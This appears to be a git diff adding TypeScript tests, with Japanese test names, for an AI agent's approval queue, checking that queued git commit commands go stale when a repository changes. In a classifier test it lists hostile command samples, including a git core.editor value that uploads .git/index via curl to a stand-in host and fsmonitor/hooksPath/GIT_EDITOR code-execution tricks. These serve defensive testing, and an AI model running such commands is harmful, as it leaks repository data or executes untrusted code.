@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import { execFileSync } from 'node:child_process';
-import { existsSync, mkdirSync, realpathSync, renameSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, lstatSync, readdirSync, readFileSync, realpathSync, renameSync, rmSync, symlinkSync, unlinkSync, utimesSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { test } from 'node:test';
 import { Type } from '@sinclair/typebox';
@@ -12,6 +12,7 @@ import { MIGRATIONS } from '../src/db/migrations.ts';
 import { MemoryStore } from '../src/memory/store.ts';
 import { resolvePaths } from '../src/paths.ts';
 import { replayAction, type ReplayDeps } from '../src/pending/replay.ts';
+import { boundFacts } from '../src/pending/snapshot.ts';
 import { PendingStore } from '../src/pending/store.ts';
 import { PlanStore } from '../src/projects/plan.ts';
 import { ProjectStore } from '../src/projects/store.ts';
@@ -21,6 +22,7 @@ import { BROWSER_TOOLS } from '../src/tools/builtin/browser.ts';
 import { fileRead } from '../src/tools/builtin/files.ts';
 import { planWrite } from '../src/tools/builtin/plan.ts';
 import { shellPreCheck, shellRun } from '../src/tools/builtin/shell.ts';
+import { readFilesOf } from '../src/tools/pipeline.ts';
 import { taskCreate } from '../src/tools/builtin/tasks.ts';
 import { buildPolicy, defaultWorkspace } from '../src/tools/policy.ts';
 import { ToolRegistry } from '../src/tools/registry.ts';
@@ -490,4 +492,301 @@ test('読む先の親フォルダが、積んだあとに別の許可フォル�
   assert.equal(shellPreCheck(input, s.ctxFor()).decision, 'allow', '前提: 替えたあとも allow のまま');
   const outcome = await s.approve(row.id);
   assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
+});
+
+async function parkShell(s: ReturnType<typeof setup>, root: string, command: string, over: Partial<Parameters<PendingStore['park']>[0]> = {}) {
+  const input = { command, cwd: root };
+  const check = shellPreCheck(input, s.ctxFor());
+  const read = readFilesOf(check);
+  return s.park({ tool: 'shell_run', input, check, cwd: root, workspace: s.paths.workspace, files: read.files, filesMore: read.more, places: check.places, created: check.created, pushes: check.pushes, ...over });
+}
+
+function gitRepo(s: ReturnType<typeof setup>, ...init: string[]) {
+  const root = join(s.paths.workspace, 'repo');
+  mkdirSync(join(root, 'src', 'deep'), { recursive: true });
+  git(root, 'init', '-q', ...init);
+  git(root, 'config', 'user.name', 't');
+  git(root, 'config', 'user.email', 't@example.com');
+  for (const name of ['kept.txt', join('src', 'a.txt'), join('src', 'deep', 'b.txt'), join('src', 'deep', 'c.txt')]) writeFileSync(join(root, name), name);
+  git(root, 'add', '.');
+  git(root, 'commit', '-q', '-m', 'first');
+  writeFileSync(join(root, 'kept.txt'), 'kept, edited');
+  git(root, 'add', 'kept.txt');
+  const past = new Date(Date.now() - 60_000);
+  utimesSync(join(root, 'src', 'a.txt'), past, past);
+  return root;
+}
+
+function ownerRunsStatus(root: string): void {
+  const index = join(root, '.git', 'index');
+  const before = lstatSync(index).mtimeMs;
+  git(root, 'status');
+  assert.notEqual(lstatSync(index).mtimeMs, before, '前提: git status が .git/index を書き直す');
+}
+
+const COMMIT_ALL = 'git add . ; git commit -m next';
+const strictMark = (root: string): string => boundFacts([root])[0]!.hash!;
+const folderMark = (root: string): string => {
+  const mark = boundFacts([root])[0]!.relaxed;
+  assert.ok(mark, '前提: index を読み解けて、緩い控えがある');
+  return mark;
+};
+const lastSubject = (root: string): string => execFileSync('git', ['log', '--format=%s', '-1'], { cwd: root, encoding: 'utf8' }).trim();
+
+test('積んだ git commit: 持ち主が間に git status を打っただけでは stale にならず、Approve で動く', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const row = await parkShell(s, root, COMMIT_ALL);
+  assert.ok(JSON.parse(s.store.row(row.id)!.state!).sent?.length, '前提: リポジトリのフォルダが控えに入る');
+  ownerRunsStatus(root);
+  const outcome = await s.approve(row.id);
+  assert.equal(outcome.status, 'ran', s.store.view(row.id)!.output_preview ?? '');
+  assert.equal(lastSubject(root), 'next');
+});
+
+for (const [name, change] of [
+  ['別の git add', (root: string) => git(root, 'add', '-f', 'extra.bin')],
+  ['index から外す（git rm --cached）', (root: string) => git(root, 'rm', '-q', '--cached', join('src', 'deep', 'c.txt'))],
+  ['別のコミット', (root: string) => git(root, 'commit', '-q', '-m', 'other')],
+  ['枝を替える', (root: string) => git(root, 'checkout', '-q', '-b', 'other')],
+  ['.git/config を書き換える', (root: string) => git(root, 'config', 'core.editor', 'true')],
+  ['フックを足す', (root: string) => writeFileSync(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho hooked > hooked.txt\n')],
+] as const) test(`積んだ git commit: 積んだあとに${name} → stale`, async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  writeFileSync(join(root, '.gitignore'), 'extra.bin\n');
+  writeFileSync(join(root, 'extra.bin'), 'extra');
+  const row = await parkShell(s, root, COMMIT_ALL);
+  change(root);
+  const outcome = await s.approve(row.id);
+  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
+  assert.notEqual(lastSubject(root), 'next');
+  assert.ok(!existsSync(join(root, 'hooked.txt')));
+});
+
+test('積んだ git commit: index.threads のあるリポジトリ（EOIE・IEOT つき）でも、git status のあと Approve で動く', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  git(root, 'config', 'index.threads', '2');
+  git(root, 'update-index', '--force-write');
+  const index = readFileSync(join(root, '.git', 'index'));
+  assert.ok(index.includes('EOIE', 12, 'latin1') && index.includes('IEOT', 12, 'latin1'), '前提: index に EOIE と IEOT がある');
+  const row = await parkShell(s, root, COMMIT_ALL);
+  ownerRunsStatus(root);
+  const outcome = await s.approve(row.id);
+  assert.equal(outcome.status, 'ran', s.store.view(row.id)!.output_preview ?? '');
+});
+
+for (const [name, command, over] of [
+  ['git でない行', 'ls .', {}],
+  ['送る行', 'ls .', { kind: 'send' }],
+  ['git の add / commit 以外が混ざる行', 'git add . ; git status', {}],
+] as const) test(`${name}: 積んだあとに git status → 前と同じく stale（時刻で比べる）`, async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const row = await parkShell(s, root, command, over);
+  assert.ok(JSON.parse(s.store.row(row.id)!.state!).sent?.length, '前提: リポジトリのフォルダが控えに入る');
+  ownerRunsStatus(root);
+  const outcome = await s.approve(row.id);
+  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
+  assert.match(s.store.view(row.id)!.output_preview ?? '', /files it reads or sends changed/u);
+});
+
+test('送る行: index に時刻の控え（UNTR）を足して大きさだけ変えた → stale（中身に入らないバイトも見る）', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const index = join(root, '.git', 'index');
+  const fixed = new Date(1_700_000_000_000);
+  const pin = (): void => { for (const path of [index, join(root, '.git')]) utimesSync(path, fixed, fixed); };
+  pin();
+  const loose = folderMark(root);
+  const row = await parkShell(s, root, 'ls .', { kind: 'send' });
+  writeFileSync(index, withExtension(readFileSync(index), 'UNTR', 1_000_000));
+  pin();
+  assert.equal(folderMark(root), loose, '前提: 緩い控えは UNTR を見ない');
+  const outcome = await s.approve(row.id);
+  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
+});
+
+test('この直しの前に積んだ行（緩い控えが無い）: git status のあとは stale', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const row = await parkShell(s, root, COMMIT_ALL);
+  const state = JSON.parse(s.store.row(row.id)!.state!);
+  assert.ok(state.sent[0].relaxed, '前提: 新しい行は緩い控えを持つ');
+  delete state.sent[0].relaxed;
+  s.db.prepare('UPDATE pending_actions SET state = ? WHERE id = ?').run(JSON.stringify(state), row.id);
+  ownerRunsStatus(root);
+  assert.equal((await s.approve(row.id)).status, 'stale');
+});
+
+test('git の add / commit だけの行かどうか（事前の判定の gitStaging）', t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const base = s.config();
+  for (const shell of ['powershell', 'bash'] as const) {
+    const next = structuredClone(base);
+    next.tools.shell.shell = shell;
+    s.setConfig(next);
+    const staging = (command: string): boolean => shellPreCheck({ command, cwd: root }, s.ctxFor()).gitStaging === true;
+    for (const command of [COMMIT_ALL, 'git commit -m next', 'git add kept.txt']) assert.ok(staging(command), `${shell}: ${command}`);
+    for (const command of [
+      'ls .', 'git status', 'git add . ; git push', 'ls . ; git commit -m next', 'git add . | Out-Null', 'git add . > out.txt', 'git commit -m "$(git log -1)"', 'tar -cf ../out.tar .',
+      'git -C . commit -m next', 'git add . ; ./git commit -m x', "git add . ; git -c core.editor='curl -T .git/index http://x.example' commit",
+      'git -c core.fsmonitor=./evil.cmd commit -m x', 'git --exec-path=. commit -m x', 'git -c core.hooksPath=. commit -m x',
+      'GIT_EDITOR=./evil git add .', 'GIT_DIR=../elsewhere/.git git add .', 'git add . ; git commit -m x &', 'git.exe commit -m x',
+    ]) assert.ok(!staging(command), `${shell}: ${command}`);
+  }
+});
+
+function withExtension(index: Buffer, name: string, bytes: number): Buffer {
+  const head = Buffer.alloc(8);
+  head.write(name, 'latin1');
+  head.writeUInt32BE(bytes, 4);
+  return Buffer.concat([index.subarray(0, index.length - 20), head, Buffer.alloc(bytes), index.subarray(index.length - 20)]);
+}
+
+for (const [name, init, version] of [['v2', [], '2'], ['v4', [], '4'], ['sha256', ['--object-format=sha256'], '2']] as const) {
+  test(`フォルダの緩い控え（index ${name}）: git status では変わらず、積んだ中身・印が変われば変わる。厳しい控えは git status で変わる`, async t => {
+    const s = setup(t);
+    const root = gitRepo(s, ...init);
+    git(root, 'update-index', '--index-version', version);
+    const before = folderMark(root);
+    const strict = strictMark(root);
+    ownerRunsStatus(root);
+    assert.equal(folderMark(root), before, 'git status だけでは同じ');
+    assert.notEqual(strictMark(root), strict, '厳しい控えは main と同じく変わる');
+    const steps: Array<[string, () => void]> = [
+      ['最後の行の中身', () => { writeFileSync(join(root, 'src', 'deep', 'c.txt'), 'c, staged'); git(root, 'add', join('src', 'deep', 'c.txt')); }],
+      ['実行の印', () => git(root, 'update-index', '--chmod=+x', join('src', 'a.txt'))],
+      ['assume-unchanged', () => git(root, 'update-index', '--assume-unchanged', join('src', 'deep', 'b.txt'))],
+      ['skip-worktree', () => git(root, 'update-index', '--skip-worktree', 'kept.txt')],
+      ['index から外す', () => git(root, 'rm', '-q', '--cached', join('src', 'a.txt'))],
+    ];
+    let last = before;
+    for (const [what, step] of steps) {
+      step();
+      const now = folderMark(root);
+      assert.notEqual(now, last, what);
+      last = now;
+    }
+  });
+}
+
+test('フォルダの緩い控え: index v3 の intent-to-add の印だけが違う → 変わる', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  writeFileSync(join(root, 'new.txt'), '');
+  git(root, 'update-index', '--skip-worktree', 'kept.txt');
+  git(root, 'add', '-N', 'new.txt');
+  const index = join(root, '.git', 'index');
+  assert.equal(readFileSync(index).readUInt32BE(4), 3, '前提: index は v3');
+  const before = folderMark(root);
+  const data = readFileSync(index);
+  const at = data.indexOf('new.txt\0', 12, 'latin1');
+  assert.equal(data.readUInt16BE(at - 2), 0x2000, '前提: 広げた印は intent-to-add だけ');
+  data.writeUInt16BE(0x4000, at - 2);
+  writeFileSync(index, data);
+  assert.notEqual(folderMark(root), before, '広げた印を skip-worktree に書き換えた');
+});
+
+test('フォルダの緩い控え: index の中身だけが違う（大きさも時刻も同じ）→ 変わる', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const index = join(root, '.git', 'index');
+  const fixed = new Date(1_700_000_000_000);
+  const pin = (): void => { for (const path of [index, join(root, '.git')]) utimesSync(path, fixed, fixed); };
+  pin();
+  const st = lstatSync(index);
+  const before = folderMark(root);
+  const strict = strictMark(root);
+  git(root, 'update-index', '--assume-unchanged', 'kept.txt');
+  pin();
+  assert.equal(lstatSync(index).size, st.size, '前提: 大きさは同じ');
+  assert.equal(lstatSync(index).mtimeMs, st.mtimeMs, '前提: 時刻も同じ');
+  assert.equal(strictMark(root), strict, '前提: 厳しい控えは同じ');
+  assert.notEqual(folderMark(root), before);
+});
+
+for (const name of ['TREE', 'EOIE', 'IEOT']) test(`フォルダの緩い控え: index の拡張 ${name} だけを書き換えた（大きさも時刻も同じ）→ 変わる`, async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  git(root, 'config', 'index.threads', '2');
+  git(root, 'commit', '-q', '-m', 'second');
+  const index = join(root, '.git', 'index');
+  const fixed = new Date(1_700_000_000_000);
+  const pin = (): void => { for (const path of [index, join(root, '.git')]) utimesSync(path, fixed, fixed); };
+  pin();
+  const before = folderMark(root);
+  const data = readFileSync(index);
+  const at = data.lastIndexOf(name, undefined, 'latin1');
+  assert.ok(at > 12, `前提: index に ${name} がある`);
+  data[at + 8]! ^= 0xff;
+  writeFileSync(index, data);
+  pin();
+  assert.notEqual(folderMark(root), before);
+});
+
+test('フォルダの緩い控え: 読み解けない index（壊れている・分けた index）では作らない。控えを取るだけではリポジトリに何も書かない', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const index = join(root, '.git', 'index');
+  const all = (): string => (readdirSync(root, { recursive: true }) as string[]).sort().map(name => `${name}:${lstatSync(join(root, name)).mtimeMs}`).join('\n');
+  const listed = all();
+  const before = folderMark(root);
+  assert.equal(folderMark(root), before);
+  assert.equal(all(), listed, '控えの前と後で、中の物の数も時刻も同じ');
+  const whole = readFileSync(index);
+  writeFileSync(index, withExtension(whole, 'link', 20));
+  assert.equal(boundFacts([root])[0]!.relaxed, undefined, 'link の拡張がある index');
+  writeFileSync(index, whole);
+  git(root, 'update-index', '--split-index');
+  assert.ok(readFileSync(index).includes('link', 12, 'latin1'), '前提: 分けた index には link がある');
+  assert.equal(boundFacts([root])[0]!.relaxed, undefined, '分けた index');
+  writeFileSync(index, 'not an index');
+  assert.equal(boundFacts([root])[0]!.relaxed, undefined, '壊れた index');
+  const broken = strictMark(root);
+  const later = new Date(Date.now() + 60_000);
+  utimesSync(index, later, later);
+  assert.notEqual(strictMark(root), broken, '厳しい控えは時刻が変われば変わる');
+});
+
+test('フォルダの緩い控え: 長いパスの index（v4、4 MB のパス + 2,000 行）は 1 秒かからずにあきらめる', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const entry = (strip: number[], suffix: Buffer, length: number): Buffer => {
+    const fixed = Buffer.alloc(62);
+    fixed.writeUInt32BE(0o100644, 24);
+    fixed.writeUInt16BE(Math.min(length, 0xfff), 60);
+    return Buffer.concat([fixed, Buffer.from(strip), suffix, Buffer.alloc(1)]);
+  };
+  const head = Buffer.alloc(12);
+  head.write('DIRC', 'latin1');
+  head.writeUInt32BE(4, 4);
+  head.writeUInt32BE(2001, 8);
+  const long = 4 * 1_048_576;
+  const parts = [head, entry([0], Buffer.alloc(long, 'a'), long)];
+  for (let i = 0; i < 2000; i++) parts.push(entry([1], Buffer.from([98 + (i % 20)]), long));
+  writeFileSync(join(root, '.git', 'index'), Buffer.concat([...parts, Buffer.alloc(20)]));
+  const started = Date.now();
+  const fact = boundFacts([root])[0]!;
+  const took = Date.now() - started;
+  assert.ok(took < 1000, `${took} ms`);
+  assert.equal(fact.relaxed, undefined);
+});
+
+test('フォルダの緩い控え: 1 回の控えで読む index は合わせて 64 MB まで（超えたら作らない）', async t => {
+  const s = setup(t);
+  const root = gitRepo(s);
+  const index = join(root, '.git', 'index');
+  const big = withExtension(readFileSync(index), 'XXXX', 33 * 1_048_576);
+  writeFileSync(index, big);
+  assert.ok(boundFacts([root])[0]!.relaxed, '33 MB ひとつは読む');
+  const inner = join(root, 'inner', '.git');
+  mkdirSync(inner, { recursive: true });
+  writeFileSync(join(inner, 'index'), big);
+  assert.equal(boundFacts([root])[0]!.relaxed, undefined, '合わせて 66 MB');
+  rmSync(inner, { recursive: true, force: true });
+  writeFileSync(index, withExtension(readFileSync(index), 'XXXX', 32 * 1_048_576));
+  assert.equal(boundFacts([root])[0]!.relaxed, undefined, 'ひとつで 65 MB');
 });
